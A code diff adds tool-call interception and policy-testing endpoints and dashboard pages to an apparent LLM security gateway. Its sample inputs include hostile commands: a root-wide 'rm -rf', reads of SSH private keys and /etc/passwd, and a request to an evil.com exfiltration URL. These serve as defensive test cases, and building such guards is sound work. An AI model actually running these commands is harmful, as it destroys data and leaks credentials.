@@ -28,7 +28,8 @@ config = WardenConfig.from_env()
 router_obj = create_router(config)
 audit = AuditLog("warden_audit.db")
 audit.initialize()
-policy = PolicyEngine()
+policy = PolicyEngine("policies/default.yaml")
+policy.load()
 diff_guard = DiffGuard()
 camel = CaMeLInterpreter(llm=router_obj.tier2, policy=policy)
 orchestrator = WardenOrchestrator(
@@ -43,6 +44,13 @@ class GuardRequest(BaseModel):
 
 class DiffRequest(BaseModel):
     diff: str
+
+class ToolRequest(BaseModel):
+    tool_name: str
+    args: dict = {}
+
+class PolicyTestRequest(BaseModel):
+    text: str
 
 # ── API Endpoints ─────────────────────────────────────────────────────────────
 @app.post("/api/guard")
@@ -76,6 +84,49 @@ async def diff_endpoint(req: DiffRequest):
         "action": result.action,
         "latency_ms": ms,
     }
+
+@app.post("/api/tool")
+async def tool_endpoint(req: ToolRequest):
+    t0 = time.perf_counter()
+    res = orchestrator.guard_tool_call(req.tool_name, req.args)
+    ms = round((time.perf_counter() - t0) * 1000, 2)
+    return {
+        "decision": res.decision.value.upper(),
+        "explanation": res.explanation,
+        "action": res.action,
+        "is_safe": res.is_safe,
+        "latency_ms": ms,
+    }
+
+@app.get("/api/policy/rules")
+async def policy_rules():
+    return {
+        "name": policy.policy_name,
+        "shadow_mode": policy.shadow_mode,
+        "rules": policy.rules,
+    }
+
+@app.post("/api/policy/test")
+async def policy_test(req: PolicyTestRequest):
+    t0 = time.perf_counter()
+    match = policy.evaluate(req.text)
+    ms = round((time.perf_counter() - t0) * 1000, 2)
+    if match:
+        return {
+            "matched": True,
+            "decision": match.get("decision", "flag").upper(),
+            "reason": match.get("reason", ""),
+            "rule_name": match.get("rule_name", ""),
+            "latency_ms": ms,
+        }
+    return {
+        "matched": False,
+        "decision": "ALLOW",
+        "reason": "No policy rules triggered",
+        "rule_name": "none",
+        "latency_ms": ms,
+    }
+
 
 @app.get("/api/stats")
 async def stats_endpoint():
@@ -804,6 +855,12 @@ tr:hover td { background: var(--surface2); color: var(--text); }
       <span class="icon">🔍</span> DiffGuard
       <span class="nav-badge">CI/CD</span>
     </div>
+    <div class="nav-item" onclick="goTo('toolguard',this)">
+      <span class="icon">🐫</span> CaMeL Tools
+    </div>
+    <div class="nav-item" onclick="goTo('policyrules',this)">
+      <span class="icon">📜</span> Policy Rules
+    </div>
   </div>
 
   <div class="nav-section">
@@ -1520,6 +1577,102 @@ Example:
 
     </div><!-- page-calculator -->
 
+    <!-- ── Tool Interceptor Page (CaMeL) ────────────────────────────────── -->
+    <div id="page-toolguard" class="page">
+      <div class="card">
+        <div class="card-title">🐫 CaMeL Tool Call Interceptor
+          <div class="info-btn" style="margin-left:6px;">i
+            <div class="tooltip">CaMeL data-flow capability tracker intercepts LLM tool call requests before execution. Ensures untrusted data control arguments cannot invoke destructive file or system operations.</div>
+          </div>
+        </div>
+
+        <div class="field">
+          <div class="label-row"><span class="label">TOOL NAME</span></div>
+          <select id="toolNameSelect" onchange="updateToolArgsTemplate()">
+            <option value="delete_file">delete_file (File destruction)</option>
+            <option value="exec_command">exec_command (System execution)</option>
+            <option value="read_sensitive">read_file (Sensitive path access)</option>
+            <option value="http_request">http_request (Network egress)</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <div class="label-row"><span class="label">ARGUMENTS (JSON)</span></div>
+          <textarea id="toolArgsInput" style="height:90px;font-family:var(--mono);">{
+  "path": "/etc/passwd"
+}</textarea>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" id="toolScanBtn" onclick="runToolScan()">🐫 Intercept Tool Call</button>
+        </div>
+
+        <div class="result-card" id="toolResultCard" style="margin-top:16px;">
+          <div class="result-header">
+            <div class="decision-pill" id="toolPill">—</div>
+            <div class="tier-tag">CAMEL CAPABILITY TRACKER</div>
+            <div class="latency-tag" id="toolLatency">—</div>
+          </div>
+          <div class="result-body">
+            <div class="result-row">
+              <div class="result-key">Action</div>
+              <div class="result-val" id="toolAction">—</div>
+            </div>
+            <div class="result-row">
+              <div class="result-key">Explanation</div>
+              <div class="result-val" id="toolExplanation">—</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div><!-- page-toolguard -->
+
+    <!-- ── Policy Rules Page ─────────────────────────────────────────────── -->
+    <div id="page-policyrules" class="page">
+      <div class="card">
+        <div class="card-title">📜 Policy Engine Sandbox (declarative policies/default.yaml)</div>
+
+        <div class="field">
+          <div class="label-row"><span class="label">TEST INPUT AGAINST ACTIVE POLICIES</span></div>
+          <textarea id="policyTestInput" placeholder="Enter text or code snippet to test policy rules (e.g. import requests, os.system('rm -rf /'), AKIA1234567890123456)..." style="height:90px;"></textarea>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn btn-primary" onclick="runPolicyTest()">📜 Test Policy Rules</button>
+        </div>
+
+        <div class="result-card" id="policyTestResult" style="margin-top:16px;">
+          <div class="result-header">
+            <div class="decision-pill" id="policyPill">—</div>
+            <div class="tier-tag" id="policyRuleTag">POLICY ENGINE</div>
+            <div class="latency-tag" id="policyLatency">—</div>
+          </div>
+          <div class="result-body">
+            <div class="result-row">
+              <div class="result-key">Reason</div>
+              <div class="result-val" id="policyReason">—</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Active Policy Rules (from policies/default.yaml)
+          <button class="btn btn-ghost" style="margin-left:auto;padding:4px 10px;font-size:11px;" onclick="loadPolicyRules()">↻ Refresh Rules</button>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr>
+              <th>Rule Name</th><th>Scope</th><th>Match Conditions</th><th>Action</th><th>Message</th>
+            </tr></thead>
+            <tbody id="policyRulesBody">
+              <tr><td colspan="5" style="color:var(--text3);text-align:center;padding:20px;">Loading active policy rules...</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div><!-- page-policyrules -->
+
   </div><!-- .content -->
 </div><!-- .main -->
 </div><!-- .layout -->
@@ -1549,14 +1702,16 @@ function insertDiffEx(i) { document.getElementById('diffInput').value = DIFF_EXA
 
 /* ── Navigation ────────────────────────────────────────────────────────── */
 const PAGE_META = {
-  guard:      { title: 'Guard Check',  sub: 'Route a payload through the security tier cascade' },
-  diffguard:  { title: 'DiffGuard',    sub: 'Scan git diffs and code for vulnerabilities before merge' },
-  history:    { title: 'Audit Log',    sub: 'Immutable record of every security decision' },
-  stats:      { title: 'Live Stats',   sub: 'Session routing statistics and power efficiency' },
-  benchmarks:  { title: 'Benchmarks',   sub: 'Real AMD W7900 results — 210 samples, red-team, stress matrix, telemetry' },
-  testrunner:  { title: 'Test Runner',   sub: 'Run any test suite live · streams output · saves results with timestamp' },
-  calculator:  { title: 'ROI Calculator', sub: 'With vs Without Warden — power, cost, latency, attack savings' },
-  settings:    { title: 'Settings',     sub: 'Routing thresholds, modes, and system status' },
+  guard:       { title: 'Guard Check',           sub: 'Route a payload through the security tier cascade' },
+  diffguard:   { title: 'DiffGuard',             sub: 'Scan git diffs and code for vulnerabilities before merge' },
+  toolguard:   { title: 'CaMeL Tool Interceptor', sub: 'Intercept and verify LLM tool call requests before execution' },
+  policyrules: { title: 'Policy Engine',          sub: 'Declarative YAML Policy-as-Code rules and evaluation sandbox' },
+  history:     { title: 'Audit Log',             sub: 'Immutable record of every security decision' },
+  stats:       { title: 'Live Stats',            sub: 'Session routing statistics and power efficiency' },
+  benchmarks:  { title: 'Benchmarks',            sub: 'Real AMD W7900 results — 210 samples, red-team, stress matrix, telemetry' },
+  testrunner:  { title: 'Test Runner',            sub: 'Run any test suite live · streams output · saves results with timestamp' },
+  calculator:  { title: 'ROI Calculator',         sub: 'With vs Without Warden — power, cost, latency, attack savings' },
+  settings:    { title: 'Settings',              sub: 'Routing thresholds, modes, and system status' },
 };
 
 function goTo(page, el) {
@@ -1567,11 +1722,12 @@ function goTo(page, el) {
   const m = PAGE_META[page] || {};
   document.getElementById('topbarTitle').textContent = m.title || '';
   document.getElementById('topbarSub').textContent = m.sub || '';
-  if (page === 'history')    loadHistory();
-  if (page === 'stats')      refreshStats();
-  if (page === 'benchmarks') loadBenchmarks();
-  if (page === 'testrunner') loadRunHistory();
-  if (page === 'calculator') { calcUpdate(); }
+  if (page === 'history')     loadHistory();
+  if (page === 'stats')       refreshStats();
+  if (page === 'benchmarks')  loadBenchmarks();
+  if (page === 'testrunner')  loadRunHistory();
+  if (page === 'calculator')  { calcUpdate(); }
+  if (page === 'policyrules') loadPolicyRules();
 }
 
 /* ── Guard Scan ────────────────────────────────────────────────────────── */
@@ -2226,6 +2382,106 @@ function calcUpdate() {
 
 // Init calculator on load
 calcUpdate();
+
+/* ── CaMeL Tool Interceptor JS ────────────────────────────────────────────── */
+const TOOL_TEMPLATES = {
+  delete_file: '{\n  "path": "/etc/passwd"\n}',
+  exec_command: '{\n  "cmd": "rm -rf / --no-preserve-root"\n}',
+  read_sensitive: '{\n  "path": "/root/.ssh/id_rsa"\n}',
+  http_request: '{\n  "url": "http://evil.com/exfiltrate"\n}'
+};
+
+function updateToolArgsTemplate() {
+  const tool = document.getElementById('toolNameSelect').value;
+  document.getElementById('toolArgsInput').value = TOOL_TEMPLATES[tool] || '{}';
+}
+
+async function runToolScan() {
+  const tool_name = document.getElementById('toolNameSelect').value;
+  let args = {};
+  try {
+    args = JSON.parse(document.getElementById('toolArgsInput').value);
+  } catch(e) {
+    alert('Invalid JSON in Arguments field');
+    return;
+  }
+  const btn = document.getElementById('toolScanBtn');
+  btn.disabled = true;
+  document.getElementById('toolResultCard').classList.remove('show');
+
+  try {
+    const r = await fetch('/api/tool', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({tool_name, args})
+    });
+    const d = await r.json();
+    const dec = d.decision || 'ALLOW';
+    const pill = document.getElementById('toolPill');
+    const cls = {ALLOW:'pill-ALLOW', BLOCK:'pill-BLOCK', FLAG:'pill-FLAG'}[dec] || 'pill-ALLOW';
+    const icon = {ALLOW:'✓', BLOCK:'✕', FLAG:'⚠'}[dec] || '?';
+    pill.className = 'decision-pill ' + cls;
+    pill.innerHTML = icon + ' ' + dec;
+    document.getElementById('toolLatency').textContent = d.latency_ms + ' ms';
+    document.getElementById('toolAction').textContent = d.action || '—';
+    document.getElementById('toolExplanation').textContent = d.explanation || '—';
+    document.getElementById('toolResultCard').classList.add('show');
+  } catch(e) {
+    alert('Error scanning tool call: ' + e.message);
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+/* ── Policy Engine JS ─────────────────────────────────────────────────────── */
+async function loadPolicyRules() {
+  try {
+    const r = await fetch('/api/policy/rules');
+    const d = await r.json();
+    const tbody = document.getElementById('policyRulesBody');
+    if (!d.rules || d.rules.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="5" style="color:var(--text3);text-align:center;padding:20px;">No policy rules found.</td></tr>';
+      return;
+    }
+    tbody.innerHTML = d.rules.map(rule => {
+      const act = (rule.action||'').toUpperCase();
+      const cls = act === 'BLOCK' ? 'td-block' : act === 'FLAG' ? 'td-flag' : act === 'ALLOW' ? 'td-allow' : '';
+      const matchStr = JSON.stringify(rule.match||{});
+      return `<tr>
+        <td style="font-family:var(--mono);font-size:11px;font-weight:600;">${rule.name||'—'}</td>
+        <td style="font-family:var(--mono);font-size:11px;">${rule.scope||'general'}</td>
+        <td style="font-family:var(--mono);font-size:11px;max-width:250px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" title="${matchStr.replace(/"/g,"'")}">${matchStr}</td>
+        <td class="${cls} font-mono" style="font-weight:600;">${act}</td>
+        <td style="font-size:12px;color:var(--text2);">${rule.message||'—'}</td>
+      </tr>`;
+    }).join('');
+  } catch(e) {}
+}
+
+async function runPolicyTest() {
+  const text = document.getElementById('policyTestInput').value.trim();
+  if (!text) return;
+  try {
+    const r = await fetch('/api/policy/test', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({text})
+    });
+    const d = await r.json();
+    const dec = d.decision || 'ALLOW';
+    const pill = document.getElementById('policyPill');
+    const cls = {ALLOW:'pill-ALLOW', BLOCK:'pill-BLOCK', FLAG:'pill-FLAG'}[dec] || 'pill-ALLOW';
+    const icon = {ALLOW:'✓', BLOCK:'✕', FLAG:'⚠'}[dec] || '?';
+    pill.className = 'decision-pill ' + cls;
+    pill.innerHTML = icon + ' ' + dec;
+    document.getElementById('policyRuleTag').textContent = (d.rule_name && d.rule_name !== 'none') ? 'RULE: ' + d.rule_name : 'POLICY ENGINE';
+    document.getElementById('policyLatency').textContent = d.latency_ms + ' ms';
+    document.getElementById('policyReason').textContent = d.reason || '—';
+    document.getElementById('policyTestResult').classList.add('show');
+  } catch(e) {
+    alert('Error evaluating policy: ' + e.message);
+  }
+}
 </script>
 
 </body>
